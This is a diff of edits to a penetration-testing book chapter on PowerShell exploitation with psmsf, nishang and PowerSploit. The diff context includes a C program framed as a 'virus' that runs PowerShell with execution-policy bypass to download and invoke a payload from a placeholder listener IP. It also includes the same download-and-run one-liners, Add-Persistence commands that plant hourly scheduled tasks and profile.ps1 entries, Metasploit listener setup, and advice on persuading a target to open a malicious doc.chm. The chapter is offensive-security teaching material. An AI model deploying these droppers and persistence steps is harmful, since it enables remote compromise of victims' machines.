@@ -284,8 +284,7 @@ You can find the video of how this attack is played out at [https://youtu.be/a01
 
 If you do not already have `psmsf` on your attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.
 
-{#powershell-exploitation-with-psmsf-play}
-{icon=bomb}
+{icon=bomb} {#powershell-exploitation-with-psmsf-play}
 G> ## The Play
 G>
 G> Go ahead and run `python psmsf`, you will be provided with the details you need to take the next steps.
@@ -339,19 +338,15 @@ G> Now let us create our binary virus, we will write this in c. I am going to ca
     {
       // Once the following line has executed, we will have our shell.
       // system executes any command string you pass it.
-      // Windows is happy with PowerShell of course.
       // noprofile causes no profile scripts to be loaded up front.
-      // Not sure if script execution is enabled on target system? No problem,
-      //   just set executionpolicy to bypass for this session.
-      // This tells PowerShell to just trust that you know what you are doing,
-      //   and that we are happy to download and run a malicious payload.
+      // Set executionpolicy to bypass will enable script execution for this session, telling PS
+      // to trust that you know what you are doing in downloading -> running scripts.
       // Invoke the EXpression: download the payload and execute it.
       // Providing the payload does not trigger anti virus, this should not.
       system("powershell.exe -noprofile -executionpolicy bypass \"IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))\"");
     
       // Add content here to make your target think this is a legitimate helpful tool.
       // Or just do nothing and you may have to explain to your target that it is broken.
-    
       // Add the following if you want the terminal to stay open.
       //char buff[10];
       //fgets (buff, sizeof(buff), stdin);
@@ -482,8 +477,7 @@ When `psmsf` is run as per above, the Metasploit `windows/meterpreter/reverse_tc
 
 `psmsf` then replaces any instances of `\x` with `0x`.
 
-`psmsf` then passes the cleaned up `reverse_tcp` shellcode to a function  
-([`generate_powershell_script`](https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L83-L103)) that embeds it into a PowerShell script that is going to become the main part of our payload.
+`psmsf` then passes the cleaned up `reverse_tcp` shellcode to a function called [`generate_powershell_script`](https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L83-L103) that embeds it into a PowerShell script that is going to become the main part of our payload.
 
 That code looks like the following, I have added the annotations to help you understand how it works:
 
@@ -596,8 +590,7 @@ You can find the video of how this attack is played out at []().
 
 If you do not already have `nishang` on your Windows attack machine, go ahead and clone it as discussed in the Tooling Setup chapter of Fascicle 0.
 
-{#powershell-exploitation-via-office-documents}
-{icon=bomb}
+{icon=bomb} {#powershell-exploitation-via-office-documents}
 G> ## The Play
 G>
 G> Follow the directions from the [Powershell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play from above, but just swap out the section where we created the c virus and replace with the following:
@@ -670,7 +663,7 @@ G>
 
 #### Adding Persistence C/- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/) {#vps-identify-risks-adding-persistence-co-powersploit}
 
-We can do better than `meterpreter`. PowerSploit has a module called [Persistence](https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1), and that is what we use in this play. This adds persistence to the PowerShell one liner that was embedded in the `psmsf` virus we created [above](#download-psmsf-payload-execute), namely `download-payload-execute`, and also used in the office document attack with `nishang`. The one liner was:
+We can do better than `meterpreter`. PowerSploit has a module called [Persistence](https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1), and that is what we use in this play. This adds persistence to the PowerShell one liner that was embedded in the `psmsf` virus we created [above](#download-psmsf-payload-execute), namely [`download-payload-execute`](#download-psmsf-payload-execute), and also used in the office document [attack with `nishang`](#powershell-exploitation-via-office-documents). The one liner was:
 
 {title="persistentFetchRunPayload.ps1", linenos=off, id="persistentFetchRunPayload-ps1", lang=PowerShell}
     IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))
@@ -683,6 +676,7 @@ I had a play with the `nishang` [`Add-Persistence.ps1`](https://github.com/samra
 I> ## Synopsis
 I>
 I> In this play we extend the [PowerShell Exploitation via Office Documents](#powershell-exploitation-via-office-documents) play with the help from PowerSploit
+
 
 
 
@@ -704,12 +698,12 @@ G>
 G> The next command imports the `ScriptModification` module for the command we use below where we need `Out-EncodedCommand`:  
 G> `PS C:\Source\PowerSploit\Persistence> Import-Module ..\ScriptModification`
 G>
-G> For the user that runs our virus with elevated privileges:  
+G> In case target runs virus with elevated privileges, you need to run:  
 G> `PS C:\Source\PowerSploit\Persistence>$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -Hourly`  
-G> For the user that runs our virus with standard privileges:  
+G> In case target runs virus with standard privileges, you need to run:  
 G> `PS C:\Source\PowerSploit\Persistence>$UserOptions = New-UserPersistenceOption -ScheduledTask -Hourly`
 G>
-G> This next command is responsible for creating the script ([`Persistence.ps1`](#Persistence-ps1)), and its encoded form ([`EncodedPersistentScript.ps1`](EncodedPersistentScript-ps1)), that when downloaded from the attackers hosting location and invoked atomically by the `doc.chm` that `nishang` creates for us below, persists the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form into the targets PowerShell profile. If the target is running as administrator when they open the `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%windir%\system32\Windows­PowerShell\v1.0\profile.ps1`, and an hourly scheduled task set to run `PowerShell.exe` as `System`. If the target is running as a low privileged user when they open the `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%UserProfile%\Documents\Windows­PowerShell\profile.ps1`, and an hourly scheduled task set to run `PowerShell.exe` as the user. When `PowerShell.exe` runs, it implicitly runs what ever is in your `profile.ps1`  
+G> This next command is responsible for creating the script ([`Persistence.ps1`](#Persistence-ps1)), and its encoded form ([`EncodedPersistentScript.ps1`](#EncodedPersistentScript-ps1)), that when downloaded from the attackers hosting location and invoked atomically by the `doc.chm` that `nishang` creates for us below, persists the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form into the targets PowerShell profile. If the target is running as administrator when they open the `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%windir%\system32\Windows­PowerShell\v1.0\profile.ps1`, and an hourly scheduled task set to run `PowerShell.exe` as `System`. If the target is running as a low privileged user when they open the `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%UserProfile%\Documents\Windows­PowerShell\profile.ps1`, and an hourly scheduled task set to run `PowerShell.exe` as the user. When `PowerShell.exe` runs, it implicitly runs what ever is in your `profile.ps1`  
 G> `PS C:\Source\PowerSploit\Persistence>Add-Persistence -FilePath C:\Users\kim\Desktop\persistentFetchRunPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1`
 G>
 G> Just as in the [PowerShell Exploitation via Office Documents](#vps-identify-risks-powershell-exploitation-via-office-documents-co-nishang) above, the `persistentFetchRunPayload.ps1` is used.  
@@ -746,7 +740,7 @@ G> The encoded form of the above script `Persistence.ps1` is `EncodedPersistentS
 G> `EncodedPersistentScript.ps1` now needs to be hosted somewhere. For this play we will just host it on our Kali Linux VM that we are using to listen for the reverse shell. I tried downloading and `I`nvoking `EX`pression from ISE using both:
 
 {linenos=off, lang=PowerShell}
-    `IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/Persistence.ps1 '))
+    IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/Persistence.ps1 '))
     # and:  
     IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/EncodedPersistentScript.ps1 '))
 
@@ -768,7 +762,8 @@ G>
 G> Now it is time to setup our listening Metasploit ready to catch the reverse shell when our target runs the `doc.chm`. We use the same `powershell_msf.rc` resource file that `psmsf` created for us in the [PowerShell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play above.  
 G> Start your listener using the `powershell_msf.rc` resource rile:  
 G> `msfconsole -r powershell_msf.rc`
-G>
+
+{icon=bomb}
 G> Now you need to get the `doc.chm` onto your targets machine or a network share that your target can access/copy from, and persuade your target to run the `doc.chm`. When they do, as discussed above, the contents of `persistentFetchRunPayload.ps1` encoded, will be written to the PowerShell profile and a scheduled task setup. When the task fires, as in the previous attacks, the `payload.txt` will be downloaded and its expression invoked, which will cause the reverse shell to be executed. The listening Metasploit will catch the shell. If you have the scheduled task configured to run every hour, then you will get a reverse shell every hour. This survives reboots and most other actions any user will take, other than removing the PowerShell profile contents we created or removing the scheduled task.
 
 The PowerSploit Persistence module offers the following persistence techniques:
@@ -788,7 +783,7 @@ At the following stages:
 
 I> Be aware if you want to use the `OnIdle` parameter, that the Windows Task Scheduler service only checks every 15 minutes to see if the computer is in an idle state. The computer is considered to be [idle if](https://social.technet.microsoft.com/Forums/windows/en-US/692783e7-bb73-45d1-95d6-8f2d1363d6c7/cant-get-task-schedular-to-run-a-batch-on-idle?forum=w7itprogeneral):
 I>
-I> 1) A screen saver is running, or
+I> 1) A screen saver is running, or  
 I> 2) if no screen saver is running, the CPU is at 0% usage, and there is 0% disk I/O for 90% of the past fifteen minutes, and if there has been no keyboard or mouse input for that period of time.
 
 T> The easiest way to kill many instances of `powershell` when you are experimenting is to run the following command:  
